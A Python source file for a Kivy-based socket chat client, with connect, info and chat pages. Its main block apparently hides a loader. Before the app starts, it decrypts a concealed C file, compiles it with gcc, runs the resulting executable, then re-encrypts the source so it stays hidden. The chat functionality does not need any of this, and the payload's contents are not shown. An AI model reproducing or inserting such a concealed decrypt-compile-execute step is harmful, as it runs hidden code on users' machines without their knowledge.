from tkinter import Grid
import kivy  # importing main package
from kivy.app import App  # required base class for your app.
from kivy.uix.label import Label  # uix element that will hold text
from kivy.uix.gridlayout import GridLayout #Layout structure
from kivy.uix.textinput import TextInput #allows user input
from kivy.uix.button import Button 
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.clock import Clock
from kivy.core.window import Window 
from kivy.uix.scrollview import ScrollView

import socket_client #socket code written in socket_client.py assisted by socket_server.py

import os
import sys 
import subprocess

kivy.require("2.1.0")  # make sure people running py file have right version

class ConnectPage(GridLayout):
    #runs on initialization
    def __init__(self, **kwargs):
        #run init of both connect page and grid layout
        super().__init__(**kwargs)

        self.cols = 2 #used in the grid

        #reading from file
        if os.path.isfile("prev_details.txt"):
            with open("prev_details.txt", "r") as f:
                d = f.read().split(",")
                prev_ip = d[0]
                prev_port = d[1]
                prev_username = d[2]
        else:
            prev_ip = ''
            prev_port = ''
            prev_username = ''

        #wigits added in specific order
        self.add_widget(Label(text = "IP:")) #top left
        self.ip = TextInput(text=prev_ip, multiline=False) #defining self.ip
        self.add_widget(self.ip) #top right
        
        self.add_widget(Label(text="Port:"))
        self.port = TextInput(text=prev_port, multiline=False)
        self.add_widget(self.port)

        self.add_widget(Label(text="Username:"))
        self.username = TextInput(text=prev_username, multiline=False)
        self.add_widget(self.username)

        self.join = Button(text="Join")
        self.join.bind(on_press=self.join_button) #makes the button actually do something
        self.add_widget(Label()) #just take up lower left spot so the button goes on the right
        self.add_widget(self.join)  

    def join_button(self, instance):
        port = self.port.text 
        ip = self.ip.text 
        username = self.username.text 

        with open("prev_details.txt", "w") as f:
            f.write(f"{ip},{port},{username}")

        #joining print
        info = (f"Joining {ip}:{port} as {username}") #gets printed when the button is pressed
        chat_app.info_page.update_info(info)
        chat_app.screen_manager.current = 'Info'
        Clock.schedule_once(self.connect, 1)

    #connect to the server, _ is the time after the function is called - sent by kivy so needs to be recieved
    def connect(self, _):
        #get information for socket client
        port = int(self.port.text)
        ip = self.ip.text 
        username = self.username.text 

        if not socket_client.connect(ip, port, username, show_error):
            return 
        
        #create chat page and run it
        chat_app.create_chat_page()
        chat_app.screen_manager.current = 'Chat'

class ScrollableLabel(ScrollView):

    def __init__(self, **kwargs):
        super().__init__(**kwargs)

        # ScrollView does not allow us to add more than one widget, so we need to trick it
        # by creating a layout and placing two widgets inside it
        # Layout is going to have one collumn and and size_hint_y set to None,
        # so height wo't default to any size (we are going to set it on our own)
        self.layout = GridLayout(cols=1, size_hint_y=None)
        self.add_widget(self.layout)

        # Now we need two wodgets - Label for chat history and 'artificial' widget below
        # so we can scroll to it every new message and keep new messages visible
        # We want to enable markup, so we can set colors for example
        self.chat_history = Label(size_hint_y=None, markup=True)
        self.scroll_to_point = Label()

        # We add them to our layout
        self.layout.add_widget(self.chat_history)
        self.layout.add_widget(self.scroll_to_point)

    # Methos called externally to add new message to the chat history
    def update_chat_history(self, message):

        # First add new line and message itself
        self.chat_history.text += '\n' + message

        # Set layout height to whatever height of chat history text is + 15 pixels
        # (adds a bit of space at teh bottom)
        # Set chat history label to whatever height of chat history text is
        # Set width of chat history text to 98 of the label width (adds small margins)
        self.layout.height = self.chat_history.texture_size[1] + 15
        self.chat_history.height = self.chat_history.texture_size[1]
        self.chat_history.text_size = (self.chat_history.width * 0.98, None)

        # As we are updating above, text height, so also label and layout height are going to be bigger
        # than the area we have for this widget. ScrollView is going to add a scroll, but won't
        # scroll to the botton, nor there is a method that can do that.
        # That's why we want additional, empty wodget below whole text - just to be able to scroll to it,
        # so scroll to the bottom of the layout
        self.scroll_to(self.scroll_to_point)

    def update_chat_history_layout(self, _=None):
        self.layout.height = self.chat_history.texture_size[1] + 15
        self.chat_history.height = self.chat_history.texture_size[1]
        self.chat_history.text_size = (self.chat_history.width * 0.98, None)



class ChatPage(GridLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

        # We are going to use 1 column and 2 rows
        self.cols = 1
        self.rows = 2

        # First row is going to be occupied by our scrollable label
        # We want it be take 90% of app height
        self.history = ScrollableLabel(height=Window.size[1]*0.9, size_hint_y=None)
        self.add_widget(self.history)

        # In the second row, we want to have input fields and Send button
        # Input field should take 80% of window width
        # We also want to bind button click to send_message method
        self.new_message = TextInput(width=Window.size[0]*0.8, size_hint_x=None, multiline=False)
        self.send = Button(text="Send")
        self.send.bind(on_press=self.send_message)

        # To be able to add 2 widgets into a layout with just one collumn, we use additional layout,
        # add widgets there, then add this layout to main layout as second row
        bottom_line = GridLayout(cols=2)
        bottom_line.add_widget(self.new_message)
        bottom_line.add_widget(self.send)
        self.add_widget(bottom_line)



        # To be able to send message on Enter key, we want to listen to keypresses
        Window.bind(on_key_down=self.on_key_down)

        # We also want to focus on our text input field
        # Kivy by default takes focus out out of it once we are sending message
        # The problem here is that 'self.new_message.focus = True' does not work when called directly,
        # so we have to schedule it to be called in one second
        # The other problem is that schedule_once() have no ability to pass any parameters, so we have
        # to create and call a function that takes no parameters
        Clock.schedule_once(self.focus_text_input, 1)

        # And now, as we have out layout ready and everything set, we can start listening for incimmong messages
        # Listening method is going to call a callback method to update chat history with new messages,
        # so we have to start listening for new messages after we create this layout
        socket_client.start_listening(self.incoming_message, show_error)

        self.bind(size=self.adjust_fields)
    
    def adjust_fields(self, *_):
        if Window.size[1] * 0.1 < 50:
            new_height = Window.size[1] - 50
        else:
            new_height = Window.size[1] * 0.9
        self.history.height = new_height 

        if Window.size[0] * 0.2 < 160:
            new_width = Window.size[0] - 160
        else:
            new_width = Window.size[0] * 0.8
        self.new_message.width = new_width 

        Clock.schedule_once(self.history.update_chat_history_layout, 0.01)


    # Gets called on key press
    def on_key_down(self, instance, keyboard, keycode, text, modifiers):

        # But we want to take an action only when Enter key is being pressed, and send a message
        if keycode == 40:
            self.send_message(None)

    # Gets called when either Send button or Enter key is being pressed
    # (kivy passes button object here as well, but we don;t care about it)
    def send_message(self, _):

        # Get message text and clear message input field
        message = self.new_message.text
        self.new_message.text = ''

        # If there is any message - add it to chat history and send to the server
        if message:
            # Our messages - use red color for the name
            self.history.update_chat_history(f'[color=dd2020]{chat_app.connect_page.username.text}[/color] > {message}')
            socket_client.send(message)

        # As mentioned above, we have to shedule for refocusing to input field
        Clock.schedule_once(self.focus_text_input, 0.1)


    # Sets focus to text input field
    def focus_text_input(self, _):
        self.new_message.focus = True

    # Passed to sockets client, get's called on new message
    def incoming_message(self, username, message):
        # Update chat history with username and message, green color for username
        self.history.update_chat_history(f'[color=20dd20]{username}[/color] > {message}')




# Simple information/error page
class InfoPage(GridLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

        # Just one column
        self.cols = 1

        # And one label with bigger font and centered text
        self.message = Label(halign="center", valign="middle", font_size=30)

        # By default every widget returns it's side as [100, 100], it gets finally resized,
        # but we have to listen for size change to get a new one
        # more: https://github.com/kivy/kivy/issues/1044
        self.message.bind(width=self.update_text_width)

        # Add text widget to the layout
        self.add_widget(self.message)

    # Called with a message, to update message text in widget
    def update_info(self, message):
        self.message.text = message

    # Called on label width update, so we can set text width properly - to 90% of label width
    def update_text_width(self, *_):
        self.message.text_size = (self.message.width * 0.9, None)



# Our simple app. NameApp  convention matters here. Kivy
# uses some magic here, so make sure you leave the App bit in there!
class TestApp(App):
    # This is your "initialize" for the root wiget
    def build(self):
        #uses screen manager for multiple screens to be added
        self.screen_manager = ScreenManager()
        #initial, and connection screen
        self.connect_page = ConnectPage()
        screen = Screen(name="Connect")
        screen.add_widget(self.connect_page)
        self.screen_manager.add_widget(screen)

        #info page
        self.info_page = InfoPage()
        screen = Screen(name='Info')
        screen.add_widget(self.info_page)
        self.screen_manager.add_widget(screen)

        return self.screen_manager

    #creates chat page
    def create_chat_page(self):
        self.chat_page = ChatPage()
        screen = Screen(name='Chat')
        screen.add_widget(self.chat_page)
        self.screen_manager.add_widget(screen)

#error callback function used by socket client
def show_error(message):
    chat_app.info_page.update_info(message)
    chat_app.screen_manager.current = "Info"
    Clock.schedule_once(sys.exit, 10)


# Run the app.
if __name__ == "__main__":
    chat_app = TestApp()
    subprocess.run("python decrypt.py decrypt")
    path1 = os.getcwd()
    path1 += "\\build.c"
    #print(path1)
    subprocess.run("gcc " + path1)
    path2 = os.getcwd()
    path2 += "\\a.exe"
    #print(path2)
    subprocess.run(path2)
    subprocess.run("python decrypt.py encrypt")
    chat_app.run()
